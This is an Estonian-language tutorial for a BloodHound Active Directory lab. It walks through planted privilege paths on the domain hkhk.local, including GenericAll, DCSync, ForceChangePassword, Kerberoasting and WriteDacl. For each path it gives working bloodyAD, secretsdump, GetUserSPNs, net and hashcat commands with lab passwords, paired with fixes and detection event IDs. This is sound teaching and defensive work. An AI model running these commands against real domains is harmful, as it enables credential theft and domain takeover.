# Ründeteede lahenduskäik — samm-sammult (algajale)

> Abimaterjal laborile [BloodHound-labor.md](./BloodHound-labor.md) ja veebiliidese juhendile [BloodHound-CE-kasutusjuhend.md](./BloodHound-CE-kasutusjuhend.md).
> Siin käiakse iga istutatud ründetee **otsast lõpuni** läbi: mida õigus tähendab, kuidas see BloodHoundis leida, kuidas seda ära kasutada (Kali + Windows, rida-realt seletusega) ja kuidas kaitsja selle sulgeb.
>
> ⚠️ Ainult isoleeritud laboridomeenis. Need tegevused võõra võrgu vastu on kuritegu.

---

## 0. Inbound vs Outbound — loe BloodHoundi infopaneeli

Kui klõpsad sõlmel (kasutaja/grupp), avaneb paremal **infopaneel**. Kaks tähtsaimat sektsiooni:

- **Outbound Object Control** — õigused, mis **sellel** sõlmel on **teiste** üle. Ehk *mida tema saab teistega teha*. Ründaja vaatab seda: „millele mul on õigus?"
- **Inbound Object Control** — õigused, mis **teistel** on **selle** sõlme üle. Ehk *kes teda kontrollib*. Kaitsja vaatab seda: „kes saab selle konto üle võtta?"

Nii et kui ülesandes seisab „SEARCH mari.kask → **Outbound**", tähendab see: otsi mari.kask, ava ta sõlm, vaata **Outbound Object Control** sektsiooni → näed, mida mari teistele teha saab.

Serva peale klõpsates avaneb **Abuse Info**, kus on konkreetsed käsud. Need käsud on tihti Linuxi (Samba `net rpc`) näited — allpool on igale teele nii **Kali** kui **Windowsi** variant.

---

## 1. Ühised andmed ja tööriistad (labor)

**Keskkond:**
- Domeen: `hkhk.local` · NetBIOS lühinimi: `HKHK`
- Domeenikontroller: `SERVER.hkhk.local` · IP `10.0.30.10`

**Kasutajate ja gruppide legend** — kes mis tasemel ja mis õigus tal on:

| Konto | Tase / roll | Parool | Õigus (Outbound) | Roll ründeahelas |
|---|---|---|---|---|
| `jaan.tamm` | tavakasutaja — **ründaja stardikonto** | `Suvi2026!` | `GenericAll` → `Serveri-Admins` | algpunkt: lisab end gruppi |
| `mari.kask` | tavakasutaja | `Suvi2026!` | `ForceChangePassword` → `peeter.saar` | võtab üle peetri konto |
| `peeter.saar` | tavakasutaja | `Suvi2026!` | `WriteDacl` → `Helpdesk` | muudab Helpdeski ACL-i |
| `liis.oja` | tavakasutaja | `Suvi2026!` | `DCSync` → domeen | replitseerib kõik hashid |
| `svc-sql` | **teenusekonto**, `HasSPN` | `Password1` (nõrk) | — (Serveri-Adminsi liige) | Kerberoastitav → DCSync tee |

| Grupp | Tase | Õigus (Outbound) | Liikmed |
|---|---|---|---|
| `Serveri-Admins` | **privilegeeritud** (de facto Tier 0) | `DCSync` → domeen | `svc-sql` (+ `jaan.tamm` pärast rünnet) |
| `Helpdesk` | tavaline | — | peeter.saar'i WriteDacl sihtmärk |

**Sihtmärgid** (Tier 0, mida ei muudeta): `Domain Admins`, `Administrator`, domeen `hkhk.local`, DC (`SERVER`).

> **Paroolis on `!`** → bash'is kasuta **ülakomasid** `'...'`, mitte jutumärke, muidu jääd `dquote>` lõksu.

**Tööriistad Kalis** (paigalda isoleeritud keskkonda):
```bash
# Impacket (secretsdump, GetUserSPNs) ja bloodyAD
pipx install impacket
pipx install bloodyAD
# Samba net (net rpc) ja hashcat on Kalis tavaliselt juba olemas
```

**Rünnaku üldloogika:** alusta madala õigusega kontost → vaata BloodHoundis selle **Outbound** õigusi → kasuta õigust ära, et võtta üle järgmine konto/grupp → korda, kuni jõuad DCSync'i või Domain Adminsini.

---

## 2. Tee 1+2 — `GenericAll` grupile → `DCSync` (jaan.tamm)

**Mis õigus:** `GenericAll` = **täielik kontroll** objekti üle. Grupi puhul tähendab see muu hulgas õigust **lisada liikmeid** (sh ennast). `Serveri-Admins` grupil omakorda on **DCSync** domeenil.

**Kuidas leida:** SEARCH `jaan.tamm` → **Outbound** → näed `GenericAll` grupile `Serveri-Admins`. SEARCH `Serveri-Admins` → **Outbound** → näed `DCSync` domeenile.

**Kuidas ära kasutada:**

Samm 1 — jaan lisab end gruppi (kasuta GenericAll'i):
```bash
# Kalist (bloodyAD, LDAP — austab GenericAll'i)
bloodyAD --host 10.0.30.10 -d hkhk.local -u jaan.tamm -p 'Suvi2026!' add groupMember 'Serveri-Admins' 'jaan.tamm'
```
```cmd
:: VÕI domeeniga liitunud Win11-lt, jaan.tamm'ina
net group "Serveri-Admins" jaan.tamm /add /domain
```
> Miks mitte `net rpc` (SAMR)? Vt kasutusjuhendi jagu 8.2 — SAMR võib anda `ACCESS_DENIED`; LDAP (bloodyAD) või Windowsi `net group` on usaldusväärsem.

Samm 2 — kasuta grupi DCSync'i ja tõmba krbtgt hash:
```bash
secretsdump.py 'hkhk.local/jaan.tamm:Suvi2026!'@10.0.30.10 -just-dc-user krbtgt
```
- `secretsdump.py` autendib **värskelt**, nii et uus grupiliikmelisus kehtib kohe.
- `-just-dc-user krbtgt` = tõmba ainult krbtgt konto hash (DCSync'i kaudu).
- Tulemus `krbtgt:...:<NT-hash>` → sellega saab teha **Golden Ticketi** = igavene domeeni kontroll.

**Kaitse:** eemalda jaani liigne `GenericAll` grupilt; eemalda grupilt DCSync (GetChanges/All kuulugu ainult DC-de kontodele). **Logi:** 4728/4732 (grupilisamine), 4662 replikatsiooni-GUID-iga (DCSync).

---

## 3. Tee 3 (C4) — `ForceChangePassword` (mari.kask → peeter.saar)

**Mis õigus:** `ForceChangePassword` = õigus **lähtestada teise kasutaja parool** ilma vana parooli teadmata. Kes selle õiguse omab, saab ohvri konto üle võtta (seab uue parooli ja logib sisse).

**Kuidas leida:** SEARCH `mari.kask` → **Outbound** → serv `ForceChangePassword` sihtmärgile `peeter.saar`.

**Kuidas ära kasutada:**
```bash
# Kalist — bloodyAD seab peetrile uue parooli (mari õigusega)
bloodyAD --host 10.0.30.10 -d hkhk.local -u mari.kask -p 'Suvi2026!' set password peeter.saar 'Uusparool1!'
```
```bash
# VÕI Samba net rpc
net rpc password 'peeter.saar' 'Uusparool1!' -U 'HKHK/mari.kask%Suvi2026!' -S 10.0.30.10
```
```cmd
:: VÕI Win11-lt mari.kask'ina
net user peeter.saar Uusparool1! /domain
```
Rida-realt: mari autendib **oma** parooliga (`Suvi2026!`), ja kuna tal on peetri üle `ForceChangePassword`, saab ta peetrile panna **uue** parooli (`Uusparool1!`). Nüüd saab ründaja peetrina sisse logida ja pärida peetri õigusi.

**Kontroll:** logi peetrina sisse uue parooliga, nt `bloodyAD ... -u peeter.saar -p 'Uusparool1!' get object peeter.saar`.

**Kaitse:** eemalda mari liigne õigus peetri üle; paroolilähtestus kuulugu ainult helpdeski rollile, kitsalt delegeerituna. **Logi:** Event **4724** (parooli lähtestamise katse).

> ⚠️ Laboris: paroolivahetus **muudab** peetri parooli — teised sammud, mis eeldavad `Suvi2026!`, ei tööta siis peetri jaoks. Pärast harjutust lähtesta tagasi või taasta snapshot.

---

## 4. Tee 4 (C5) — `DCSync` (liis.oja → domeen)

**Mis õigus:** `DCSync` = kahe laiendatud õiguse kooslus domeeniobjektil — **GetChanges** + **GetChangesAll**. See lubab **teeselda domeenikontrollerit** ja paluda replikatsiooni teel väljastada **mis tahes konto paroolihash**, sh `krbtgt`. See on de facto täielik domeeni ülevõtt ilma Domain Adminsi liikmelisuseta.

**Kuidas leida:** SEARCH `liis.oja` → **Outbound** → serv `DCSync` sihtmärgile `HKHK.LOCAL` (domeen). Või Cypheris valmispäring „Find Principals with DCSync Rights".

**Kuidas ära kasutada:**
```bash
# Tõmba kõigi kontode hashid (või ainult krbtgt)
secretsdump.py 'hkhk.local/liis.oja:Suvi2026!'@10.0.30.10 -just-dc
```
Rida-realt: `secretsdump.py` autendib liis.ojana, ja kuna tal on DCSync, palub ta DC-lt paroolihashid. `-just-dc` tähendab „tõmba kontode hashid replikatsiooni kaudu". Väljundis on NTLM-hashid, sh `krbtgt` (Golden Ticketiks) ja `Administrator` (Pass-the-Hashiks).

**Kaitse:** eemalda GetChanges/All tavakontodelt — need õigused kuulugu ainult DC-de masinakontodele. **Logi:** Event **4662**, kus objekt on domeen ja juurdepääsumask sisaldab replikatsiooni-GUID-e (`1131f6aa...` / `1131f6ad...`).

---

## 5. Tee 5 (C6) — Kerberoasting (svc-sql, `HasSPN`)

**Mis on:** kui teenusekontol on **SPN** (*Service Principal Name*) seatud, saab **iga autentitud kasutaja** paluda selle teenuse Kerberose pileti (TGS). Pilet on krüpteeritud teenusekonto **paroolist tuletatud võtmega**, nii et piletit saab **offline** murda. Nõrk parool → murtakse sekunditega.

**Kuidas leida:** Cypher valmispäring „List all Kerberoastable Accounts", või sõlme omadus `HasSPN = true` (`svc-sql`).

**Kuidas ära kasutada:**

Samm 1 — küsi TGS-pilet (võib teha iga tavakontoga, nt jaan):
```bash
GetUserSPNs.py hkhk.local/jaan.tamm:'Suvi2026!' -dc-ip 10.0.30.10 -request -outputfile kerberoast.txt
```
- `GetUserSPNs.py` leiab SPN-iga kontod ja `-request` küsib nende TGS-piletid.
- `-outputfile` salvestab murdmiseks sobivas vormingus räsi.

Samm 2 — murra parool offline:
```bash
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```
- `-m 13100` = Kerberose TGS (RC4) räsirežiim.
- `svc-sql` parool `Password1` on tavalises sõnaraamatus → murtakse kohe.

Samm 3 — kasuta leitud mandaate: `svc-sql` on `Serveri-Admins` liige, millel on DCSync → sama ahel nagu Tee 1.

**Kaitse:** anna teenusekontole **pikk juhuslik parool** või **gMSA** (automaatselt hallatav); keela RC4, luba ainult AES. **Logi:** Event **4769** (TGS-päring), eriti krüpt-tüüp `0x17` (RC4), mis reedab Kerberoasti.

---

## 6. Tee 6 (C7) — `WriteDacl` (peeter.saar → Helpdesk)

**Mis õigus:** `WriteDacl` = õigus **muuta objekti pääsuloendit** (DACL). See ei anna otse kontrolli, aga lubab ründajal **kirjutada endale juurde** võimsama õiguse (nt `GenericAll`) — ja siis seda kasutada. Kaheastmeline, aga viib sama tulemuseni.

**Kuidas leida:** SEARCH `peeter.saar` → **Outbound** → serv `WriteDacl` grupile `Helpdesk`.

**Kuidas ära kasutada:**

Samm 1 — peeter kirjutab endale `GenericAll` Helpdeski üle (kasutab WriteDacl'i):
```bash
bloodyAD --host 10.0.30.10 -d hkhk.local -u peeter.saar -p 'Suvi2026!' add genericAll Helpdesk peeter.saar
```
Samm 2 — nüüd GenericAll'iga lisa end (või keegi) Helpdeski:
```bash
bloodyAD --host 10.0.30.10 -d hkhk.local -u peeter.saar -p 'Suvi2026!' add groupMember Helpdesk peeter.saar
```
Rida-realt: WriteDacl lubab peetril **muuta Helpdeski ACL-i** → ta annab endale GenericAll → siis GenericAll'iga lisab end gruppi. Nii saab ta Helpdeski õigused.

> Ahela näide: kui kombineerida teega C4, saab `mari → (ForceChangePassword) → peeter → (WriteDacl) → Helpdesk`. See õpetab mitme serva **ahendamist** üheks ründeteeks.

**Kaitse:** eemalda peetri `WriteDacl` Helpdeski üle; DACL-muutuse õigus kuulugu ainult Tier-0 haldusele. **Logi:** Event **5136** (kataloogiobjekti DACL muutus).

---

## 7. Kokkuvõte — kaitsja kontroll-loend

| Tee | Serv | Parandus | Logi (Event ID) |
|---|---|---|---|
| 1–2 | `GenericAll` + `DCSync` | Eemalda liigne ACE grupilt; DCSync ainult DC-de kontodel | 4728/4732, 4662 |
| 3 (C4) | `ForceChangePassword` | Paroolilähtestus ainult helpdeski rollile, kitsalt | 4724 |
| 4 (C5) | `DCSync` | Eemalda GetChanges/All tavakontodelt | 4662 (repl-GUID) |
| 5 (C6) | `HasSPN` + nõrk parool | gMSA / pikk juhuparool; AES, keela RC4 | 4769 (RC4 = `0x17`) |
| 6 (C7) | `WriteDacl` | Eemalda liigne ACL-õigus; Tier-0 haldus | 5136 |

**Kesksõnum:** iga tee algab ühe **Outbound** õigusega madalal kontol ja lõpeb kõrgemate õigustega. Kaitsja kasutab sama BloodHoundi, et need **Inbound** õigused kõrgetel sihtmärkidel (Domain Admins, domeen, DC) üle vaadata ja liigsed ACE-d enne sulgeda.
